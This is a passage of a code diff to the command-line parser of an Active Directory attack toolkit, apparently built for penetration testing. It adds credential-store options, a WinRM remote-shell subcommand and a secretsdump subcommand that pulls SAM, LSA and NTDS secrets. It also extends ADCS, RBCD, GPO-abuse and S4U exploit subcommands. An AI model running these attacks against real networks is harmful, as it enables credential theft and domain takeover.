     d.add_argument(
         "--timeroast", action="store_true", help="also timeroast computer accounts"
@@ -739,6 +1312,8 @@ def read_args() -> argparse.Namespace:
     grp.add_argument("-p", "--password")
     grp.add_argument("-H", "--hash", help="NTLM hash")
     ca.add_argument("--host", default="", help="host it is valid on / to verify against")
+    ca.add_argument("-k", "--kerberos", action="store_true",
+                    help="mark it a Kerberos credential (every op using it will auth with -k)")
     ca.add_argument("-f", "--force", action="store_true",
                     help="store without verifying the credential or checking for shell access")
     ca.add_argument("--loot-dir", default=DEFAULT_LOOT)
@@ -753,15 +1328,36 @@ def read_args() -> argparse.Namespace:
     cl.add_argument("--loot-dir", default=DEFAULT_LOOT)
     cl.set_defaults(func=cred_list)
 
+    cr = csub.add_parser("rm", help="remove stored credential(s) for a user")
+    cr.add_argument("-u", "--user", required=True)
+    cr.add_argument("-d", "--domain", help="restrict to this domain")
+    cr_sec = cr.add_mutually_exclusive_group()
+    cr_sec.add_argument("-p", "--password", help="only remove this exact password")
+    cr_sec.add_argument("-H", "--hash", help="only remove this exact NTLM hash")
+    cr.add_argument("--loot-dir", default=DEFAULT_LOOT)
+    cr.set_defaults(func=cred_rm)
+
+    cu = cfgsub.add_parser(
+        "current-user",
+        help="show / set / clear the credential discover uses by default",
+    )
+    cu.add_argument("user", nargs="?", help=r"DOMAIN\user to pin (omit to show the current one)")
+    cu.add_argument("-d", "--domain", help="domain (if not given as DOMAIN\\user)")
+    cu.add_argument("-u", "--user", dest="user_opt", help="username (alternative to the positional)")
+    cu.add_argument("-k", "--kerberos", action="store_true", help="mark it as a Kerberos login")
+    cu.add_argument("--clear", action="store_true", help="unset the current user")
+    cu.add_argument("--loot-dir", default=DEFAULT_LOOT)
+    cu.set_defaults(func=current_user_cmd)
+
     # --- exploit: opt-in, one exploit on demand (never run automatically) -----
     exp = sub.add_parser("exploit", help="run a single exploit on demand (adcs / rbcd / gpo)")
     expsub = exp.add_subparsers(dest="exploit_cmd", required=True)
 
     a = expsub.add_parser("adcs", help="abuse a vulnerable ADCS template (ESCx)")
     a.add_argument("dc", nargs="?", help="domain controller IP (default: stored target)")
-    a.add_argument("-u", "--user", required=True)
-    a.add_argument("-p", "--password", required=True)
-    a.add_argument("-d", "--domain", required=True)
+    a.add_argument("-u", "--user", help="username (stored secret used if -p omitted)")
+    a.add_argument("-p", "--password")
+    a.add_argument("-d", "--domain")
     a.add_argument("--target", help="enrollment target (CA host); defaults to the DC")
     a.add_argument(
         "--esc", help="ESC class to abuse (ESC1/2/3/4/6); auto-detect if omitted"
@@ -774,9 +1370,9 @@ def read_args() -> argparse.Namespace:
 
     r = expsub.add_parser("rbcd", help="resource-based constrained delegation")
     r.add_argument("dc", nargs="?", help="domain controller IP/host (default: stored target)")
-    r.add_argument("-u", "--user", required=True)
-    r.add_argument("-p", "--password", required=True)
-    r.add_argument("-d", "--domain", required=True)
+    r.add_argument("-u", "--user", help="username (stored secret used if -p omitted)")
+    r.add_argument("-p", "--password")
+    r.add_argument("-d", "--domain")
     r.add_argument("--target", required=True, help="victim computer (delegate-to)")
     r.add_argument("--impersonate", default="Administrator")
     r.add_argument(
@@ -790,33 +1386,25 @@ def read_args() -> argparse.Namespace:
     g = expsub.add_parser(
         "gpo", help="code execution via an editable GPO (pyGPOAbuse)"
     )
-    g.add_argument("-u", "--user", required=True)
-    g.add_argument("-p", "--password", required=True)
-    g.add_argument("-d", "--domain", required=True)
+    g.add_argument("-u", "--user", help="username (stored secret used if -p omitted)")
+    g.add_argument("-p", "--password")
+    g.add_argument("-d", "--domain")
     g.add_argument("--gpo-id", required=True, help="GUID of the GPO to abuse")
     g.add_argument(
         "--command", required=True, help="PowerShell command to run in the GPO scope"
     )
     g.add_argument("--taskname", default="AutoWinTask")
-    g.set_defaults(
-        func=lambda args: _gpo.gpo_abuse(
-            args.domain,
-            args.user,
-            args.password,
-            args.gpo_id,
-            args.command,
-            args.taskname,
-        )
-    )
+    g.add_argument("--loot-dir", default=DEFAULT_LOOT)
+    g.set_defaults(func=gpo_cmd)
 
     # exploit s4u: constrained-delegation impersonation (impacket getST)
     su = expsub.add_parser("s4u", help="constrained delegation: impersonate a user to an SPN")
-    su.add_argument("-u", "--user", required=True, help="the delegation-enabled principal")
-    su_sec = su.add_mutually_exclusive_group(required=True)
+    su.add_argument("-u", "--user", help="the delegation-enabled principal (stored secret used if no secret given)")
+    su_sec = su.add_mutually_exclusive_group()
     su_sec.add_argument("-p", "--password")
     su_sec.add_argument("-H", "--hash", help="NTLM hash")
     su_sec.add_argument("--aes", help="AES key")
-    su.add_argument("-d", "--domain", required=True)
+    su.add_argument("-d", "--domain")
     su.add_argument("--spn", required=True, help="target SPN, e.g. cifs/host.corp.local")
     su.add_argument("--impersonate", default="Administrator", help="user to impersonate")
     su.add_argument("--dc-ip")
@@ -828,12 +1416,12 @@ def read_args() -> argparse.Namespace:
     dcsub = dc.add_subparsers(dest="dacl_cmd", required=True)
 
     def _dacl_auth(p: argparse.ArgumentParser) -> None:
-        p.add_argument("-u", "--user", required=True)
+        p.add_argument("-u", "--user", help="username (stored secret used if -p/-H omitted)")
         g2 = p.add_mutually_exclusive_group()
         g2.add_argument("-p", "--password")
         g2.add_argument("-H", "--hash", help="NTLM hash")
         p.add_argument("-k", "--kerberos", action="store_true", help="Kerberos (needs KRB5CCNAME)")
-        p.add_argument("-d", "--domain", required=True)
+        p.add_argument("-d", "--domain")
         p.add_argument("--dc", help="DC host to write to (default: stored target)")
         p.add_argument("--dc-ip", help="DC IP (helps when --dc is a hostname)")
         p.add_argument("--loot-dir", default=DEFAULT_LOOT)
@@ -867,6 +1455,41 @@ def read_args() -> argparse.Namespace:
     do.add_argument("--owner", help="new owner (default: the auth user)")
     do.set_defaults(func=dacl_cmd)
 
+    # exploit shell: interactive WinRM shell via evil-winrm-py
+    esh = expsub.add_parser("shell", help="interactive WinRM shell (evil-winrm-py)")
+    esh.add_argument("target", nargs="?", help="target host (default: stored target)")
+    esh.add_argument("-u", "--user", help="username (stored secret used if -p/-H omitted)")
+    esh_sec = esh.add_mutually_exclusive_group()
+    esh_sec.add_argument("-p", "--password")
+    esh_sec.add_argument("-H", "--hash", help="NTLM hash")
+    esh.add_argument("-d", "--domain")
+    # no -k here: Kerberos is a property of the credential (mark it with
+    # `config cred add -k` or `discover -k`); the shell inherits it from the store
+    esh.add_argument("--loot-dir", default=DEFAULT_LOOT)
+    esh.set_defaults(func=shell_cmd)
+
+    # exploit secretsdump: SAM / LSA / NTDS secrets via impacket-secretsdump
+    sdp = expsub.add_parser("secretsdump",
+                            help="dump SAM/LSA/NTDS secrets (impacket-secretsdump)")
+    sdp.add_argument("target", nargs="?",
+                     help="host to dump (default: stored target; use the DC with --just-dc)")
+    sdp.add_argument("-u", "--user", help="username (stored secret used if -p/-H omitted)")
+    sdp_sec = sdp.add_mutually_exclusive_group()
+    sdp_sec.add_argument("-p", "--password")
+    sdp_sec.add_argument("-H", "--hash", help="NTLM hash")
+    sdp.add_argument("-d", "--domain")
+    sdp.add_argument("-k", "--kerberos", action="store_true",
+                     help="Kerberos auth (uses the ccache in KRB5CCNAME)")
+    sdp.add_argument("--dc-ip", help="DC IP (for -k or a hostname target)")
+    sdp.add_argument("--all", action="store_true",
+                     help="dump everything (all NTDS accounts on a DC); default is just Administrator")
+    sdp.add_argument("--admin", default="Administrator",
+                     help="the single account to dump by default (default: Administrator)")
+    sdp.add_argument("--just-dc-user", help="dump only this specific account (overrides --all)")
+    sdp.add_argument("--timeout", type=int, default=600, help="seconds before giving up")
+    sdp.add_argument("--loot-dir", default=DEFAULT_LOOT)
+    sdp.set_defaults(func=secretsdump_cmd)
+
     # --- smb: interact with SMB services (list / shell / recursive download) ---
     sm = sub.add_parser(
         "smb", help="[manual] interact with SMB: shares, shell, download"
@@ -876,10 +1499,15 @@ def read_args() -> argparse.Namespace:
     def _smb_auth(p: argparse.ArgumentParser) -> None:
         p.add_argument("target", nargs="?",
                        help="target host (name or IP); default: stored target")
-        p.add_argument("-u", "--user", help="username (omit for anonymous/null)")
+        p.add_argument("-u", "--user",
+                       help="username; if it's in the cred store you can omit -p/-H "
+                            "(the stored secret is used). Omit entirely to use the "
+                            "current user / best stored credential")
         secret = p.add_mutually_exclusive_group()
         secret.add_argument("-p", "--password", help="password")
         secret.add_argument("-H", "--hash", help="NTLM hash")
+        secret.add_argument("-N", "--null", action="store_true",
+                            help="force an anonymous / null session (ignore stored creds)")
         p.add_argument("-d", "--domain", help="domain (default: local/workgroup)")
         p.add_argument(
             "-k",
@@ -938,12 +1566,12 @@ def read_args() -> argparse.Namespace:
 
     # --- ticket: request a Kerberos TGT (ccache) --------------------------
     t = sub.add_parser("ticket", help="request a Kerberos TGT and print the KRB5CCNAME to use")
-    t.add_argument("-u", "--user", required=True)
-    tsecret = t.add_mutually_exclusive_group(required=True)
+    t.add_argument("-u", "--user", help="username (stored secret used if no secret given)")
+    tsecret = t.add_mutually_exclusive_group()
     tsecret.add_argument("-p", "--password")
     tsecret.add_argument("-H", "--hash", help="NTLM hash")
     tsecret.add_argument("--aes", help="AES128/256 key")
-    t.add_argument("-d", "--domain", required=True)
+    t.add_argument("-d", "--domain")
     t.add_argument("--dc-ip", help="KDC IP (recommended)")
     t.add_argument("--loot-dir", default=DEFAULT_LOOT)
     t.set_defaults(func=ticket_cmd)
